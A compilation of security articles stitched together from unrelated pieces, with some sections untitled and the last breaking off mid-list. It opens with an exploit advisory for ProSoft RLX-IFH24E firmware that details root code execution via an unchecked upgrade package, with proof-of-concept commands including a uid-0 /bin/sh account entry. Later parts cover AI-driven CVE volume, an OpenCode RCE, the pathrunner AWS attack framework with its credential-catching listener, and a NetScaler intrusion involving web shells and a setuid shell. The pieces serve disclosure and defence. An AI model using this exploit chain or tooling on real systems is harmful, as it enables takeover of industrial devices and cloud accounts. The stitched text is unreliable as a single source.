Title: [remote] ProSoft RLX-IFH24E v2.2.44 - Unsigned Firmware Upgrade Package Executed as Root
Context: 8 and is available only by assuming that the shipped uid-500 upgrade account, whose home directory is the upload staging path and which shares the admin password hash, can reach...
Full Text: Title: ProSoft RLX-IFH24E v2.2.44 - Unsigned Firmware Upgrade Package Executed as Root Author: 0day Rubbish Research Team Contact: disclosure@0day-rubbish.com Type: remote Platform: Hardware Advisory: https://0day-rubbish.com/blog/prosoft-rlx-ifh24e-unsigned-upgrade-package-root-rce CVE: pending Description: ProSoft RLX-IFH24E, version v2.2.44, the industrial wireless radio from ProSoft Technology, Inc. (United States) whose research designation is RLX-IH 24E, installs and executes code submitted over its management interface without performing any signature, hash or CRC check on it. The appliance is a closed-source embedded device and an OEM build of the MicroHard Systems IPx21 platform on the MHX-910 board design: an Intel IXP425 XScale processor, ARM big-endian, Linux 2.4.24-uc0, with static management pages under /usr/web and 57 ARM big-endian CGI programs under /usr/lib/cgi-bin/ served by boa over HTTP and boa_ssl over HTTPS. The classification is CWE-494, download of code without integrity check, with CWE-345 and CWE-347 co-equal, because the only authenticity check in the path is a non-cryptographic string equality and no signature is verified anywhere. CWE-434, CWE-73, CWE-250 and CWE-269 contribute. It is explicitly not CWE-78 and a command-injection remediation would not fix it: the shared platform helper SubProgram_Start at offset 0xbd5c splits its argument string on spaces with strtok into at most eight tokens and then calls vfork and execvp directly, so no shell is ever invoked and shell metacharacters are inert here. The upload hop is in usr/lib/cgi-bin/tool_reprogramming.cgi, routine HandleSubmit at offset 0x8d1c, with its formatting string at rodata offset 0x2b1c. On the file1 part of a multipart/form-data POST to /cgi-bin/tool_reprogramming.cgi it calls cgiFormFileName and cgiFormTempFileName, builds the move argument with sprintf(buf, "%s /upgrade/upgrade/%s", tempfile, origfilename), runs SubProgram_Start("/bin/mv", buf), which must succeed, and then runs SubProgram_Start("/sbin/upgrade", origfilename). The client-supplied original filename is therefore used unmodified twice, once as the destination of the move and once as the installer's only argument, which makes the file extension and so the installer branch entirely the requester's choice. The handler applies no extension whitelist, no digest comparison and no path canonicalisation. The install hop is /sbin/upgrade, a short POSIX shell script shipped in the same package, running with the CGI's own privileges, which are root. It dispatches on ${FILE##*.} and its three consequential branches are: ".pkg", which tests gzip stream integrity with gunzip -t, unpacks with tar -xf into a staging tree, compares the appliance's PRODUCT_NAME read from /etc/MHX_CONFIG against a LOCK_NAME read from a lockfile inside the package itself, prints "Match image." on equality, executes ./pre, applies the inner archive with tar -xf extract/upgradepkg.tar -C /, executes ./post, prints "Upgrade Successful" and then reboots unconditionally; ".passwd", which copies the upload over both /etc/passwd and /etc/passwd_original; and ".factory", which copies the upload over /etc/db1, the configuration store holding the management interface's own transport flags, accounts and radio behaviour. The equality test is the only gate before code execution and both of its operands are available to the requester: the expected value is the compile-time platform constant IPx21PROSOFT recoverable by reading the shipped firmware once, and the asserted value is carried inside the package being installed. A package whose identity is validated against data carried inside that same package cannot be a source of assurance about it. The defect is the absence of an authenticity step, not a weak one, and strengthening the compatibility check would change nothing while both operands come from the same side. Impact: root command execution on the appliance from a single multipart/form-data POST followed by the product's own documented install sequence, with requester-authored shell code running both before and after an unconstrained archive extraction into the root of the filesystem. Attacker code reading the pre-execution state, an arbitrary rootfs write through the inner archive whose entry names are constrained in no way, and attacker code running post-write are all present in one request. The .passwd branch reaches the same privilege ceiling without executing anything, replacing both the live account database and its backup copy so that the device's own recovery path restores the modified database rather than the shipped one; since the factory admin entry is uid 0 with the restricted shell /bin/txtUI, an added uid-0 entry with /bin/sh converts an administratively restricted login into a general root shell at the next interactive login. The .factory branch lets a requester rewrite the device's security configuration, widening or narrowing the exposure of the surface they arrived through and surviving a later reconfiguration by the operator. Persistence is native to the product rather than improvised, because the install rewrites the rootfs and the installer always reboots on success. Availability is controlled at will, both by that reboot and by installing content that stops the device serving traffic, which for a radio carrying traffic between a process network and its field instruments is also a position on the path that traffic takes. Detection is weak by construction: every step is documented product behaviour, the request is an ordinary firmware upload, the response is the vendor's own success page, and a legitimate upgrade prints exactly the same "Match image." and "Upgrade Successful", so the usable indicators are post-hoc and filesystem-level, namely an installed package whose LOCK_NAME and VERSION pair corresponds to no release the operator obtained, an unexpected file under /upgrade/upgrade/, and a uid-0 account whose shell is not the vendor's restricted interface. Verification boundary, stated exactly because it is narrower than the headline suggests, and because the classification above depends on it. The installer half of the chain was measured and the upload half was not. No HTTP request was ever issued at this product and no physical appliance was used at any point, so nothing here is an exploit run against a live device and it is not presented as one. What was executed is the firmware's own /sbin/upgrade, byte-for-byte unmodified, inside an isolated chroot sandbox built on a copy of the upgrade package's own root filesystem. A crafted .pkg printed "Match image." then "Upgrade Successful" and exited 0; the pre script left a marker proving it executed and wrote PRE-RAN-AS-UID=0 into a second marker, the post script left its own marker, and the inner archive applied an entry to the root of the filesystem. The uid marker is the load-bearing evidence: the payload wrote that value at runtime rather than having it read from a configuration file, so it is the executing identity and not an inference about it. The recorded landing identity is uid=0(root). A .passwd run replaced both /etc/passwd and /etc/passwd_original with the uploaded text, proven by a pre-run digest of the pre-seeded database that no longer matched afterwards and by a marker line present in both copies. A negative control was run to establish that none of this came from the harness: a structurally identical package, same outer tar layout, same metadata files, same inner archive, same marker-writing scripts, with exactly one deliberate difference, LOCK_NAME=WRONGPRODUCT, was refused with "This unit doesn't support the image." and produced no markers anywhere. That control also isolates the product-string comparison as the single cause of refusal and makes the positive and negative runs mutually exclusive. Four substitutions existed in the harness and none in the code under test: an x86 busybox build supplied /bin/sh, tar, gunzip, mv and cp because the firmware's own copies are ARM big-endian and the host is not; a stub replaced the platform mhx utility; /etc/MHX_CONFIG was populated with the product identity the firmware itself ships; and /etc/passwd was pre-seeded with three factory-style entries for comparison. Two transcript lines, "logger: not found" and "mhx: not found", are absent helpers in the sandbox PATH and are not product behaviour. The run count is one positive .pkg run, one positive .passwd run and one negative control, in one sandbox on one host, each effect observed once, never repeated across sandbox builds and never performed on hardware. Not measured, and not claimed: the web server and its access control, because /bin/boa lives in the device base flash and is not contained in the system upgrade package, so the access control gating this CGI could be neither proved nor disproved from the artefacts available; the CGI binaries and the firmware's ARM helpers, for the architecture reason; the closing reboot, since the sandbox is a directory tree with no init, though the path up to it was observed; any privilege escalation, the chain starting from the administrative identity the product's own account database already grants uid 0; any reach into the radio baseband image RLX-IFH24E_v5089.mhx, identified but not exercised; and any impact on an attached control system, PLC or historian. Consequently the Type field above reflects the documented delivery vector, a network POST to a CGI on the management listener, and the Platform field reflects a firmware and hardware target; the part that was actually executed was the vendor's own installer acting on a supplied file, and a reader should weight the two halves of this chain differently. That is what the published advisory is written to allow. CVSS: 7.2 High (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) is the single score published for this finding, computed from first principles rather than inherited: ISS = 1 - (0.44 x 0.44 x 0.44) = 0.914816; Impact at Scope Unchanged = 6.42 x 0.914816 = 5.873119; Exploitability = 8.22 x 0.85 x 0.77 x 0.27 x 0.85 = 1.234708; Base = Roundup(7.107826) = 7.2. AV:N because the entry point is a network service and the firmware's own default configuration record inside the shipped package enables the web interface on both transports, UI_Access_HTTP=B and HTTPS=B, with non-default values for the Telnet and SSH entries; that shipped record is the evidence for a default, and the Network classification comes from the transport the artefact establishes rather than from a reach we observed. AC:L because the chain is deterministic, with no race, no timing window, no memory-layout dependency and no on-path position, and the single piece of environment knowledge it needs is a platform string published inside the shipped firmware. PR:H because installing firmware is an administrative function, the handler is a maintenance CGI linked directly from the interface's own menu pages, and the only account model the package documents for that interface is a uid-0 admin entry with a password-change page and a configurable RADIUS mode; no lower-privileged principal was demonstrated reaching the handler. UI:N because once a session holds that privilege the move, the install, both script executions and the reboot all follow from one request with no operator action and no confirmation step in the recovered handler path. Scope Unchanged because the vulnerable component and the impacted component are the same appliance operating system, the CGI already running as root, the installer already running as root and the rootfs extracted by that same root process, so no authority boundary is crossed. Three readings are published as rejected with their arithmetic: low privilege (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) computes to 8.8 and is available only by assuming that the shipped uid-500 upgrade account, whose home directory is the upload staging path and which shares the admin password hash, can reach the maintenance handler, which was not tested; Scope Changed (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) computes to 9.1 and is rejected because an unproven boundary crossing may not raise a published score; high attack complexity (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H) computes to 6.6 and is rejected because the control run isolates a wrong product string as the sole cause of refusal. Two of those rejected readings score higher than the number published, and the advisory says so itself. Two further readings are labelled conditionals and neither is the headline. An unauthenticated HTTP layer (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) would compute to 9.8 and was NOT demonstrated; it is a structural inference that applies only if the management listener does not gate the handler, and the binary that would answer that question is not in the package analysed. The supporting observation about the package is narrower and is weaker than that reading: none of the 57 shipped CGIs imports crypt, none parses or sets a session cookie and no login CGI exists in the directory, so the handler layer adds no authentication of its own, which says nothing about what the web server does before it forks a CGI. A factory credential still in place on a deployed unit would remove the need to discover any secret, but it was not demonstrated either, no authentication was performed against any appliance and no first-login behaviour was tested; under CVSS the metric prices the privilege level of the account used rather than whether its secret was public, so that reading leaves the vector unchanged at 7.2 and is published as a deployment amplifier for operators to assess. The factory password hash is deliberately not reproduced in this submission or in the advisory. No version-range claim is made: only the system upgrade package RLX-IFH24E_v2244.pkg was analysed, no other build of this model, no other version of the OEM IPx21 platform and no other product of either company is claimed as affected, although the upgrade path is a shared platform component rather than a per-product script, so a wider population of devices built on the same OEM platform plausibly shares the root cause, and that is stated as a likelihood rather than scored. Adjacent structural observations recorded in the analysis and deliberately excluded from this finding are a startup configuration that symlink-exposes /etc/MHX_CONFIG, /var/log/messages and /etc/system.debug into the web document root as configuration, syslog and debug views; a legacy debug CGI named request.cgi whose first-argument dispatch includes sending AT commands to the radio module, which was never executed and to which no AT command was sent; and SNMP community strings public and private shipped on the platform, which belong to the configuration plane. Public records were searched by product designation, by the RLX-IH name, by the OEM platform name and by the vendor name with no result describing this appliance and this root cause; the one record associated with the vendor's RadioLinx engineering-software line concerns a pseudo-random number generator in that software family, a different product and a different defect class, and records naming the platform manufacturer's own product families concern different platforms and different chains. Proof of concept, published unconditionally. The shipped script is Python 3 using only the standard library, with no third-party dependency and no hardcoded target: the target address, port, scheme, credentials, command, lock name, product name, uploaded filename, marker token and output path are all command-line arguments and default to inert values, the default target being loopback and the default payload command being true. It builds a gzip-compressed tar containing the file and lockfile metadata the installer reads, the pre and post scripts at mode 0755 and extract/upgradepkg.tar, and can either write that package to disk for inspection or carry it in a multipart/form-data POST under the part name file1. Its modes and the flags that matter: Build the package locally only, performing no network access at all: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --build-only --out demonstration.pkg Refuse a filename that would break the hand-off. The tool rejects any name containing a space or a path separator before it builds anything, because SubProgram_Start splits its argument string on spaces before execvp, so an extra token would change what /bin/mv is asked to do: --filename "payload.pkg" accepted --filename "pay load.pkg" rejected by the tool itself Build the negative control, for an operator who owns the hardware to confirm that the success path really is gated by the product string and by nothing else: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --control --build-only --out control.pkg Build the account-database variant as a local file, which is never sent unless --send is also given: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --passwd-mode --passwd-entry "marker:*:0:0:INERT-DEMONSTRATION-ENTRY:/root:/bin/sh" Deliver the built package to a management listener the operator owns and is authorised in writing to test, over HTTP or HTTPS, with optional HTTP Basic credentials: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --target <address> --port 80 --user <user> --password <pass> python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --target <address> --port 443 --https --user <user> --password <pass> The default payload is deliberately non-destructive: pre touches one marker file and writes the executing uid into a second, post touches a third, and the inner archive writes a single marker entry under the root of the filesystem. Nothing is deleted, encrypted or modified beyond those markers. The tool also prints the sha256 of what it built, so an operator can record the digest of a package before installing it, which is the one detection control that works after the fact. The script's own documentation carries a warning that applies to every reader of this submission: the network half of this chain was never exercised against an appliance, and running it against hardware you do not own or hold written authorisation to test will reboot and reimage that device, because a successful install rewrites the rootfs and the installer always reboots on success. PoC location in the public repository: product/prosoft-technology/rlx-ifh24e-v2244/unsigned-upgrade-package-root-rce/exploit/prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py Repository: https://github.com/Exploit-Garbage/0day-Rubbish Full analysis, including the sink and source inventories with offsets, the end-to-end data flow marked at the line between measurement and inference, the verification transcripts, the negative control, the authentication boundary and its limits, the detection notes, the remediation set and the derivation of every one of the six CVSS readings: https://0day-rubbish.com/blog/prosoft-rlx-ifh24e-unsigned-upgrade-package-root-rce ProSoft Technology, Inc. was notified unconditionally through the mailbox its own website publishes for reporting a potential vulnerability, under a Security Assurance heading on its Quality and Environment page, with a copy to the North America technical-support address published on its Regional Technical Support page. The research is already public, no permission was asked for, no embargo was requested, nothing is withheld pending a reply and nothing is asked in return. No report was filed with any third party and no national coordination body was involved. -- 0day Rubbish Research Team disclosure@0day-rubbish.com https://0day-rubbish.com

Title: There's only so much code: the rise in vulnerability numbers
Context: Despite a 105% year-over-year surge in CVEs, Known Exploited Vulnerabilities (KEVs) grew by only 37%, and only 3 of September's 975 Microsoft advisories saw in-the-wild...
Full Text:
Frontier AI models (like Mythos) are rapidly mining decades of technical debt across ubiquitous legacy libraries, driving monthly Microsoft Patch Tuesday vulnerability advisories up more than tenfold (reaching 1,415 this month). This volume is overwhelming open-source maintainers and putting pressure on the traditional 90-day coordinated disclosure model.

Despite a 105% year-over-year surge in CVEs, Known Exploited Vulnerabilities (KEVs) grew by only 37%, and only 3 of September's 975 Microsoft advisories saw in-the-wild exploitation, demonstrating that the vast majority of AI-discovered bugs are not practically exploited.

We may be able to take new-bug-class vulnerability spikes as evidence that these vulnerabilities will eventually level off and decline, once the historical code backlog is remediated and AI verification is embedded directly into new development pipelines.

With attackers able to parse patches faster via AI, defenders cannot cover for all possible threats. Organizations should continue to build robust defense-in-depth. Prioritize high-exploitability flaws in their specific environments, implement interim mitigations (such as LiveProtect), deploy behavioral anomaly detection, and integrate current AI evaluation models into their software build chains.

The September Microsoft Tuesday release included 975 vulnerability advisories. This month, 1,415 vulnerabilities were just dropped. Compared to a pre-June average of 100 a month, that increase is staggering. Where did they come from?

As of April, frontier models came onto the scene more fine-tuned than ever toward vulnerability detection, particularly with the introduction of Mythos. The deluge brings a lot of questions:

If these numbers are real, why hasn’t the internet collapsed?

Are these vulnerabilities a new breed, and if not, why didn’t analysts find them in code that is sometimes decades old?

Is the coordinated disclosure model still relevant in an era of this kind of speed?

How in the world do defenders deal with those numbers?

Should we go home, kiss our spouses, and prepare for the end?

The answer to many of these questions boils down to this: The majority of these vulnerabilities are coming from repositories of old code from large-profile products and systems; and disclosure does not equal weaponization.

Where is it from?

AI is chewing through a backlog of technical debt in libraries and tools used as the dependable, best-practice lynchpins of so many environments. These models have a new perspective, an ability to "think" without some of the hangups or assumptions of human defenders, and they are thorough in listing those vulnerabilities.

Entrenched older tools have always been prime targets because of their predictability; attackers know those tools and all their secrets, and they know what is likely to be present in a network with them. Multi-exploit attacks can be deployed with little variability.

Pre-Mythos threat actors exploited log4j (CVE-2021-44228) to immense success. The library was ubiquitous, included in nearly every environment, but not a component that got cataloged in visibility scans. A combination of scale and low visibility meant defenders were blindsided, scrambling to find out if they even used the log4j library before starting to concoct a mitigation plan.

Talos has ongoing relationships with some of the largest technical vendors (such as the Microsoft Active Protections Process (MAPP) agreement). Organizations share additional information—detection guidance or maybe a POC — for vulnerabilities that are most likely to be exploited, to enable Talos to provide adequate coverage when the advisories are announced. "Microsoft believes it is important for us to provide detection content, based on their guidance," as Yves Younan, Director of Talos Vulnerability Discovery, Detection, and Testing, says.

Talos has needed to invest more resources to get coverage in on time for critical vendors like Microsoft to keep up with notifications coming in fast and often on staggered or out-of-band timelines.

For larger vendors, the pressure is handleable for now. However, open-source projects are getting flooded. Some projects have a trusted group that can combine to tackle patches, and some share with the full community for immediate assistance, but it is up to the project. The internet runs on open-source work.

The pace of discovery presents a challenge for the traditional coordinated disclosure system vulnerability hunters have been using for years, and some are calling it into question.

Security vulnerabilities should be reported, to enable an informed defender base and regular patching, and vendors responsible for vulnerable code need time to create coverage. A timed disclosure model where notifications are sent to a vendor, who then has a set period of time (typically 90 days) to provide coverage before the disclosure is released publicly, has created a more secure online environment for decades.

Now, many practitioners are releasing advisories publicly without a disclosure period beforehand. The reasoning is that if one AI can find a weakness, any other could, so the vulnerability is already, effectively, released.

This conversation is actively changing expectations around vulnerability disclosure, and guidance is in flux.

Will it stay this high?

No one knows the future, but we can always look to the past for insight.

Numbers of vulnerabilities jump drastically when a new bug class is identified, as their possibilities are explored to the fullest. Then the discoveries plateau and drop off.

When format string vulnerabilities were discovered as a new bug class in 2000, the initial influx of discoveries ramped up and up, until reaching a peak in 2005 and then slowly declining over the next couple of years. Format string vulnerabilities are still discovered, but they are a smaller overall fraction of the number of CVEs discovered in a year.

Theoretically, AI-assisted vulnerability discovery could go the same way.

While frontier models have not discovered a new vulnerability class, they are more efficient at discovering known types of software vulnerabilities. Given that a lot of vital software has a long history of code releases, there’s plenty of code to mine for weaknesses. But there’s only so much code… right?

Old and commonly used tools are often under the highest scrutiny, lending them one kind of safety: Because of their popularity, utility, and stability, when popular tools have vulnerabilities, they are discovered fast and patched promptly.

As the historical backlog of essential systems is turned over by AI, vulnerabilities will be found and patched. New code will ideally be run through AI bug-checkers that will prevent new vulnerabilities from being introduced. The rate of new vulns should level off and drop accordingly.

There are some caveats. In the past, as vulnerability disclosures increased through coordinated disclosures, we saw increased adoption of mitigations. Exploitation became significantly harder. Attackers often need to chain together 3 or more vulnerabilities to successfully exploit a system.

However, more awareness of vulnerabilities often leads to more exploitation. Attackers often use vendor patches meant to protect customers to discover where vulnerabilities might exist. The frequency of patching has delayed human attackers via parsing bottlenecks, but AI can eliminate that problem.

Are the numbers the real issue?

The volume is certainly up.

Fresh as this blog is being finished, the October Patch Tuesday dropped almost 500 more than last month.

With refinement, any vulnerability could become a link to a path of effect. But... not all vulnerabilities are exploitable. Some are wildly impractical for attacker use. In fact, the percent of Known Exploited Vulnerabilities (KEVs) is vastly smaller than the found vulnerabilities.

Of the 975 vulnerabilities Microsoft reported in September, there were only three in-the-wild exploits detected. When viewed by percentage, vulnerabilities versus KEVs tell a different and perhaps reassuring story.

Compared with the same period last year, additions to the known-exploited vulnerability list increased by 37%, while published CVEs increased by 105%. However, we wouldn't necessarily expect those figures to grow in proportion. Adversaries only need enough useful vulnerabilities to compromise their targets, and the same vulnerabilities can be reused against many organizations. The KEV count tracks distinct vulnerabilities known to be exploited, not the number of attacks or successful compromises.

AI helps ingest code, advisory reports, and attack surfaces with inhuman speed, but it cannot currently make judgment calls about the value of a weakness.

For defenders, the question remains the same: Which vulnerabilities provide a viable path into their environment, and how do you close those paths?

What do we do now?

The undeniable danger here is in exploitation time going down rapidly, while the vulnerabilities that could become exploits is still going up. The biggest hurdle for a defender is determining what is a real vulnerability for their environment, and what is not.

Different defenders have different forms of control depending on their role.

For those who are writing code, the new standard validation chain should include AI evaluation by models at least as up to date as those being used to hunt for vulnerabilities. It is relatively cheap to run new code through AI, but very expensive to run a cumbersome backlog of old code through. Bite it off in chunks.

For those whose role involves keeping the tools ready: Upgrade ASAP. Don't stop there.

For Cisco customers, implement LiveProtect to mitigate vulnerabilities between advisory release day and patching, to give time for that patching. Do this for everything you own.

Move beyond static domain blocking and implement behavioral detection that alerts on anomalous traffic patterns directed toward automation platforms.

Hone your focus to the vulnerabilities with the highest exploitability in your environment. KEVs are far less common among the sea of advisories, and their numbers have not risen proportionally with the AI-assisted deluge.

Focus on building defense-in-depth. Employ multiple protection systems, to cover for delays in patching. Implement interim mitigations (such as LiveProtect), create custom IPS/Snort triggers to block pre-patched traffic using SnortML, deploy behavioral anomaly detection, and integrate current AI evaluation models in software build chains.

Dive deeper into this conversation with the latest TTP interview with Yves Younan and vulnerability researcher Bella Fusari.

For more numbers and advice for defenders:

Don't swing at everything

The Pillar Security team reported the vulnerability privately via GitHub Security Advisory with full reproduction material at the end of August 2026.

A month later, Anomaly, the company behind OpenCode, confirmed it had received the report, but said malicious MCP servers are “outside their threat model.”

Pillar Security researchers said Anomaly patched the vulnerability on September 28 in version 1.18.33 – without a CVE or security advisory. “As a result, conventional vulnerability scanners and dependency alerts will not identify affected installations, potentially leaving enterprises unaware that they need to upgrade,” Pillar Security researchers warned.

URL Validation Falls Short of Preventing OpenCode RCE Attacks

Pillar Security researchers claimed that the standard fix isn’t enough to fully remediate this vulnerability, which they assessed should be allocated a critical severity rating (CVSS) of 9.8.

According to the researchers, URL scheme validation alone cannot prevent the attack because the malicious payload can be embedded in a seemingly legitimate HTTPS URL.

On Windows, the vulnerable open dependency passed the URL to PowerShell without properly escaping it, allowing the shell to interpret part of the URL as a command.

Although OpenCode added URL scheme checks in version 1.18.33, the researchers said the crucial fix was to update the dependency to a version that correctly quotes the URL, preventing PowerShell from interpreting the payload as executable code.

They recommend that developers avoid passing untrusted URLs through shell commands altogether, instead using argument-based process execution to reduce the risk of command injection.

OpenCode RCE Flaw Unrelated to Recent Console Security Breach

This vulnerability report comes a few days after OpenCode confirmed a security breach affecting its Console, which allows teams to share access to AI models through centrally managed API credentials.

Speaking to Infosecurity, Pillar Security’s Cohen stressed that this newly disclosed vulnerability was not related to the Console breach.

“The breach hit a legacy system behind a hosted key proxy, and exposed provider keys users had stored there. The vulnerability we reported runs the other way: a malicious remote MCP server executing code on a developer's own machine during the OAuth handshake. Different target and attacker position,” he explained.

Nevertheless, Cohen highlighted that both incidents come down to the same thing, “Who you let hand credentials and inputs to an AI coding tool, and what that tool does with them.”

Full Text:
In December 2025, we released pathfinding.cloud, a catalog of AWS IAM privilege escalation techniques. Pathfinding.cloud defines the sets of permissions that would allow an AWS IAM principal to gain access to another AWS IAM principal. In May 2026, we released Pathfinding Labs, a collection of intentionally vulnerable AWS environments that can be deployed into a sandbox account, exploited, and torn down. You can use these labs to learn how the techniques documented in pathfinding.cloud are exploited.

Today, we're releasing pathrunner, a modular, cloud-native offensive security framework designed to help automate the exploitation of the paths defined in pathfinding.cloud and instantiated in Pathfinding Labs.

Full documentation for pathrunner and all of its commands and exploit modules can be found at https://pathfinding.cloud/pathrunner/.

Why build an offensive tool?

Every defender has more security vulnerabilities and misconfigurations on their plate than they have time to resolve, which means they must triage and carefully choose where they spend their finite remediation time. An offensive tool demonstrates the impact of an attack, enabling defenders to prioritize exploitable misconfigurations based on how impactful they are.

When assessing software vulnerabilities, we look for publicly accessible Proof of Concept (PoCs) exploits. If those exist, we increase the severity of related findings. When it comes to misconfigurations, exploitability can be more difficult to determine. For example, what's an exploitable misconfiguration vs. simply a missing best practice?

Offensive security approaches can pinpoint the specific misconfigurations that are exploitable and show exactly how they can be exploited in your environment. Defenders and offensive security teams alike both widely use offensive security tools like Metasploit and Bloodhound. There is nothing quite like seeing a vulnerability or misconfiguration in your environment actually exploited!

Pathrunner in action

The best way to understand what pathrunner can do is to watch it in action. In the following clip, we'll walk through the following actions:

Importing the credentials for an AWS IAM user identity that we've gained access to

Selecting an exploit module that our victim identity has permission to execute

Selecting the target identity that we want to access

Executing the attack and capturing the credentials of the target identity

Automatically importing the new credentials and switching to them

Validating that we have successfully accessed the target identity

Your browser does not support the video tag.

Identities are the sessions of the cloud

In traditional on-prem Active Directory environments, when attackers compromise a workload, the best and most likely path to the next hop in the attack path is usually through another workload, which is often a server or user workstation. Each connection between a workload and the attacker is called a session, because it is usually a TCP session between the two hosts. Not all escalations pivot through workloads, of course (e.g., kerberosting), but "attacker to workload" sessions are certainly very common in traditional Active Directory environments.

In cloud environments, the script is flipped. There are still occasional times where an attack hops from one workload to another and sends network sessions back to the attacker's command and control servers, but more often than not, penetration testers and real attacks are hopping from one cloud identity to another by accessing credentials. Sometimes this happens by executing code on a remote workload, and sometimes no workload is involved at all.

For these reasons, identities are fundamental to pathrunner. The very first pathrunner feature we created was the ability to import identities from multiple text-based formats by using a simple command: pathrunner identity add --from-clipboard. The second feature was the corresponding pathrunner identity switch [name] command, which enables you to easily switch between multiple identities.

Here's a look at two configured identities in pathrunner. The identity named bedrock-001 is associated with the initial set of credentials, which we first gain access to as the "attacker." The identity named bedrock_codeinterpreter_1790097483 is associated with the post-exploitation identity that we gain access to after running the bedrock-001 exploit in pathrunner.

Modular by design

Pathrunner's modular design was heavily influenced by a few successful exploitation frameworks of years past, like Metasploit, CrackMapExec (now NetExec), and Empire (now forked and maintained here). And even in the AWS cloud realm, we have Pacu and Nebula. These modular tools allow the operator to exploit multiple misconfigurations or vulnerabilities within the same user interface, which makes them much easier to use.

As of October 2026, there are over 80 exploit modules in pathrunner.

Modular payloads make for better detections

Another foundational decision that we made when building pathrunner was to support modular payloads. For an offensive security practitioner, sometimes certain payloads just don't work. Maybe there are network access restrictions or organizational service control policies in place. Providing multiple payloads for each module lets the user pick the payload that makes the most sense.

Another key benefit of having multiple payloads in an offensive security tool is that it allows you to build and evaluate more detections. If your detections only support a specific post exploitation action, like creating a new administrative user and granting administrator access to it, you will be blind when an attacker goes in another direction. Instead, if you walk through each and every pathrunner payload in your environment and build detections for each of them, you will have a much greater chance of catching malicious activity.

Use pathrunner to manage your "attacker" infrastructure

In cloud compromises, it is a common practice for attackers to stage their payload or exploit artifacts on external sources or to exfiltrate data or credentials to those external sources. They often use additional compromised cloud accounts to host their infrastructure.

Offensive security practitioners often use additional cloud accounts that they own to replicate this pattern. Done manually, this can be a tedious task. In pathrunner, we built this functionality in! We included support for adding an "attacker" identity and the ability to deploy "attacker" infrastructure in an AWS account that you control, separate from any "victim" AWS accounts.

In practice, if you configure your attacker identity with pathrunner attacker identity add and then type attacker infra ec2 create, pathrunner will create an EC2 instance in your own "attacker" account, deploy a second instance of pathrunner on that instance, put the right security groups in place, and show you how to connect to it via SSH or SSM.

Once you connect, you can then start a remote listener on the publicly accessible EC2 instance by using attacker listener start and start collecting credentials. In other words, with pathrunner, you can set up a remote endpoint to catch credentials with just three commands.

Here's the end-to-end flow showing how it all works. In the video, pay attention to the iTerm2 tabs at the top. I'll switch between MY MAC and ATTACKER AWS when showing how I can run an exploit from MY MAC, but catch the credentials on the "attacker" infra instance of pathrunner.

Your browser does not support the video tag.

Alternatively, if you initially run pathrunner on a remotely accessible host that already has some public callback ports open, you can skip all of the remote deployment steps and just start the listener with attacker listener start. That's it!

Be a team player: Give your blue team an audit log

As mentioned earlier, it is quite impactful to show a defender exactly how you were able to exploit a misconfiguration in their environment. It's even more helpful to show exactly what audit log events your activity generated, along with timestamps for when those events occurred. We have good news! Pathrunner has this functionality built in as well. If you type workspace report --output pathrunner.html, you will get a report that is ready to hand over to the defenders.

There are two main parts to this report. First, it shows you the resources that were created or modified during your use of pathrunner. You can manually clean these up when you are done, or you can use the workspace cleanup all sub-command.

Second, the report includes a table that lists all of the CloudTrail events that we think pathrunner would have triggered, along with timestamps and descriptions.

What's Next?

We hope that pathrunner helps you improve your cloud detection capabilities, as well as the overall security posture of your environment. Please head over to the pathrunner repo if you would like to suggest features, let us know about bugs, or contribute to the project, and don't forget about the complete command reference guide at https://pathfinding.cloud/pathrunner/.

AI-Driven Attacks Threaten to Widen the Patching Gap

The Moody’s report also warned that AI agents are already capable of exploiting vulnerabilities and compromising systems within days. It documented containment failures during developer testing at OpenAI and Anthropic, although OpenAI’s case involved an internal evaluation rather than an attack by a threat actor.

The report noted that no comparable threat-actor campaign at that scale has been publicly documented.

However, the barriers to fully autonomous cyber-attacks are likely temporary, Moody’s analysts noted.

High computing costs and restricted access to frontier AI models currently limit their use in large-scale campaigns. The report cited the UK AI Security Institute, which estimated that the cyber-capability gap between open-weight and frontier models had narrowed to four to seven months, from six to 10 months previously.

Organizations with weak patching practices face the greatest credit risk, according to the Moody’s report.

Those with large digital networks are particularly exposed because their broader attack surfaces create more opportunities for exploitation. Smaller and mid-sized companies could also become more economically viable targets as AI reduces the cost and effort required to carry out cyber-attacks, the analysts noted.

Published on October 19, this Moody’s report uses February 2026 data from Bitsight Technologies that accounted for vulnerabilities disclosed over previous two years.

“Meaningful advances in AI's offensive cyber capabilities since then may have further reduced the average time to exploit; remediation times may also have changed,” the Moody’s report noted.

Title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
Context: gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway https://unit42
Full Text:
Overview

In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments.

The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.

The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline.

Key findings

The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username.

The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot.

After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root.

The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases.

The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges.

